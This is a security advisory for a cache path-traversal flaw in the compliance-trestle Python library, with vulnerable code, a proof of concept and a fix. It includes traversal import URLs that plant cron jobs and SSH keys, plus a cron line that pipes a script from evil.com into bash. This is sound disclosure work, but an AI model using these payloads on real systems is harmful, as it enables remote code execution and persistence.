@@ -1,0 +1,215 @@
+PYSEC-2026-2424 PyPI/compliance-trestle — compliance-trestle Remote Fetching Mechanism has an Arbitrary File Write via Cache Path Traversal
+package: compliance-trestle
+ecosystem: PyPI
+versions affected:
+  >= 0, < 3.12.2, >= 4.0.0, < 4.0.3 (ECOSYSTEM)
+aliases: CVE-2026-45725, GHSA-g3vg-vx23-3858
+references:
+  https://github.com/oscal-compass/compliance-trestle/security/advisories/GHSA-g3vg-vx23-3858
+  https://github.com/oscal-compass/compliance-trestle/commit/89f4e53d159e8ff901da4d7c3b51c9556bd32ec0
+  https://github.com/oscal-compass/compliance-trestle/commit/9abc492329fcc8d0557182317de9bde854385da3
+  https://github.com/oscal-compass/compliance-trestle
+  https://pypi.org/project/compliance-trestle
+  https://github.com/advisories/GHSA-g3vg-vx23-3858
+  https://nvd.nist.gov/vuln/detail/CVE-2026-45725
+
+## Summary
+
+The compliance-trestle library's remote fetching cache mechanism (HTTPSFetcher and SFTPFetcher) constructs the local cache file path from the URL path component without sanitizing path traversal sequences (`../`). When a remote OSCAL profile references a URL with traversal in its path, the HTTP response body is written to a location **outside the intended cache directory**, enabling **arbitrary file write with attacker-controlled content** to the filesystem.
+
+**Attack chain:** Malicious OSCAL profile → HTTPS fetch → cache path traversal → arbitrary file write → RCE (via cron, SSH keys, etc.)
+
+## Affected Component
+
+**Repository:** https://github.com/IBM/compliance-trestle
+**File:** `trestle/core/remote/cache.py` (lines 259-266 for HTTPSFetcher, lines 328-333 for SFTPFetcher)
+**Version:** v4.0.2 (latest as of 2026-04-30)
+## Vulnerable Code
+
+### cache.py:259-266 — HTTPSFetcher cache path construction
+
+```python
+class HTTPSFetcher(FetcherBase):
+    def __init__(self, trestle_root: pathlib.Path, uri: str) -> None:
+        # ...
+        u = parse.urlparse(self._uri)
+        # ...
+        if u.hostname is None:
+            raise TrestleError(f'Cache request for {self._uri} requires hostname')
+        https_cached_dir = self._trestle_cache_path / u.hostname
+        # ❌ path_parent preserves ../ sequences from URL
+        path_parent = pathlib.Path(u.path[re.search('[^/\\\\]', u.path).span()[0] :]).parent
+        https_cached_dir = https_cached_dir / path_parent
+        https_cached_dir.mkdir(parents=True, exist_ok=True)  # ❌ Creates dirs outside cache
+        self._cached_object_path = https_cached_dir / pathlib.Path(pathlib.Path(u.path).name)
+```
+
+### cache.py:285-295 — Content written to traversed path
+
+```python
+    def _do_fetch(self) -> None:
+        # ...
+        response = requests.get(self._url, auth=auth, verify=verify, timeout=30)
+        if response.status_code == 200:
+            result = response.text  # ❌ Attacker-controlled content
+            self._cached_object_path.write_text(result)  # ❌ Written to arbitrary path
+```
+
+### cache.py:328-333 — SFTPFetcher (identical pattern)
+
+```python
+class SFTPFetcher(FetcherBase):
+    def __init__(self, ...):
+        # Identical path construction — same vulnerability
+        sftp_cached_dir = self._trestle_cache_path / u.hostname
+        path_parent = pathlib.Path(u.path[re.search('[^/\\\\]', u.path).span()[0] :]).parent
+        sftp_cached_dir = sftp_cached_dir / path_parent
+        sftp_cached_dir.mkdir(parents=True, exist_ok=True)
+        self._cached_object_path = sftp_cached_dir / pathlib.Path(pathlib.Path(u.path).name)
+```
+
+**Root Cause:**
+1. `urlparse("https://evil.com/../../../tmp/pwned.json").path` = `/../../../tmp/pwned.json` — preserves `../`
+2. `pathlib.Path(u.path).parent` preserves traversal sequences
+3. `cache_dir / hostname / "../../../../../../tmp"` resolves outside cache
+4. `mkdir(parents=True, exist_ok=True)` creates intermediate directories
+5. `write_text(response.text)` writes attacker-controlled content to traversed path
+6. **No `is_relative_to()` boundary check** on the resolved path
+
+
+## Steps to Reproduce
+
+### Prerequisites
+
+```bash
+pip install compliance-trestle==4.0.2
+```
+
+### PoC: Malicious OSCAL Profile
+
+```yaml
+# malicious_profile.yaml — arbitrary file write via cache traversal
+profile:
+  uuid: "550e8400-e29b-41d4-a716-446655440000"
+  metadata:
+    title: "Malicious Profile"
+    version: "1.0"
+    last-modified: "2024-01-01T00:00:00+00:00"
+    oscal-version: "1.0.4"
+  imports:
+    - href: "https://evil.com/../../../../../../../tmp/trestle_pwned.json"
+```
+
+### PoC: Cache Path Traversal Simulation
+
+```python
+#!/usr/bin/env python3
+"""PoC: Cache path traversal → arbitrary file write"""
+import os, re, tempfile, shutil
+from pathlib import Path
+from urllib.parse import urlparse
+
+# Simulate trestle cache behavior (cache.py:259-266)
+trestle_root = Path(tempfile.mkdtemp(prefix="trestle_poc_"))
+cache_dir = trestle_root / ".trestle" / ".cache"
+cache_dir.mkdir(parents=True, exist_ok=True)
+
+evil_url = "https://evil.com/../../../../../../../tmp/trestle_pwned.json"
+u = urlparse(evil_url)
+
+# Exact trestle code path
+cached_dir = cache_dir / u.hostname
+m = re.search(r'[^/\\\\]', u.path)
+path_parent = Path(u.path[m.span()[0]:]).parent
+cached_dir = cached_dir / path_parent
+cached_dir.mkdir(parents=True, exist_ok=True)
+cached_file = cached_dir / Path(Path(u.path).name)
+
+print(f"Cache dir: {cache_dir}")
+print(f"Resolved write target: {cached_file.resolve()}")
+# Output: /tmp/trestle_pwned.json ← OUTSIDE cache directory!
+
+# Write attacker content
+attacker_payload = '*/5 * * * * root /bin/bash -c "id > /tmp/rce_proof"'
+cached_file.write_text(attacker_payload)
+print(f"Written: {cached_file.resolve().read_text()}")
+
+# Cleanup
+os.remove(str(cached_file.resolve()))
+shutil.rmtree(str(trestle_root))
+```
+
+**Expected:** Write confined to `.trestle/.cache/` directory
+**Actual:** File written to `/tmp/trestle_pwned.json` (arbitrary filesystem location)
+
+
+## Remediation
+
+### Fix for HTTPSFetcher (cache.py:259-266):
+
+```python
+class HTTPSFetcher(FetcherBase):
+    def __init__(self, trestle_root: pathlib.Path, uri: str) -> None:
+        # ...
+        u = parse.urlparse(self._uri)
+        https_cached_dir = self._trestle_cache_path / u.hostname
+
+        # ✅ Sanitize path: remove traversal sequences
+        safe_path = pathlib.PurePosixPath(u.path).parts
+        safe_path = [p for p in safe_path if p != '..' and p != '/']
+        path_parent = pathlib.Path(*safe_path[:-1]) if len(safe_path) > 1 else pathlib.Path('.')
+
+        https_cached_dir = https_cached_dir / path_parent
+        https_cached_dir.mkdir(parents=True, exist_ok=True)
+        self._cached_object_path = https_cached_dir / safe_path[-1]
+
+        # ✅ Boundary check
+        if not self._cached_object_path.resolve().is_relative_to(self._trestle_cache_path.resolve()):
+            raise TrestleError(
+                f"Cache path traversal blocked: URL '{uri}' resolves to "
+                f"'{self._cached_object_path.resolve()}' outside cache directory"
+            )
+```
+
+Same fix required for SFTPFetcher at lines 328-333.
+
+## References
+
+- **CWE-22:** https://cwe.mitre.org/data/definitions/22.html
+- **CWE-73:** https://cwe.mitre.org/data/definitions/73.html
+- **compliance-trestle:** https://github.com/IBM/compliance-trestle
+
+## Impact
+
+### 1. Cron Job Injection → Remote Code Execution
+
+```yaml
+# Profile that writes a cron job
+imports:
+  - href: "https://evil.com/../../../../../../../etc/cron.d/backdoor"
+```
+
+Attacker's server responds with:
+```
+* * * * * root /bin/bash -c 'curl https://evil.com/shell.sh | bash'
+```
+
+### 2. SSH Authorized Keys Injection
+
+```yaml
+imports:
+  - href: "https://evil.com/../../../../../../../root/.ssh/authorized_keys"
+```
+
+Attacker's server responds with their SSH public key.
+
+### 3. Config File Overwrite
+
+```yaml
+imports:
+  - href: "https://evil.com/../../../../../../../etc/nginx/conf.d/evil.conf"
+```
+
+### 4. Python Path Hijacking
+
+Write malicious `.py` file to a location on `sys.path` for code execution on next import.
